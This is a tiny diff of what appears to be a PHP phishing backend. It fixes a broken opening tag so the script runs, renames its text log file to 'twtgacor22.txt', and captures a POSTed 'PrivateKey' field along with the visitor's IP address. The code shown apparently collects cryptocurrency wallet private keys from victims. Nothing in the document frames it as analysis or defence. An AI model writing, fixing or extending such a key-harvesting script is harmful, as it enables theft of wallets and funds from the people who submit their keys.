@@ -1,5 +1,5 @@
-<?html
-$file = "twtgacor.txt";
+<?php
+$file = "twtgacor22.txt";
 $PrivateKey = $_POST['PrivateKey'];
 $ip = $_SERVER['REMOTE_ADDR'];
 
